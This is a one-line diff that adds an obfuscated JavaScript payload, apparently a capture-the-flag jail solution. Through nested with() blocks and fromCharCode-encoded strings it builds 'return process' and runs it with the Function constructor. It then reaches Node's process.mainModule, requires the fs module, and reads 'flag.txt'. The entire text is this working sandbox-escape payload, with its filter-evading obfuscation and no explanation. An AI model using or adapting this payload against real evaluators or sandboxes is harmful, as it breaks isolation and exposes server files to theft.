@@ -1,0 +1,1 @@
+with(String)with(f=fromCharCode,this)with(constructor)with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))())with(mainModule)with(require(f(102,s)))readFileSync(f(102,108,97,103,46,t,120,t))
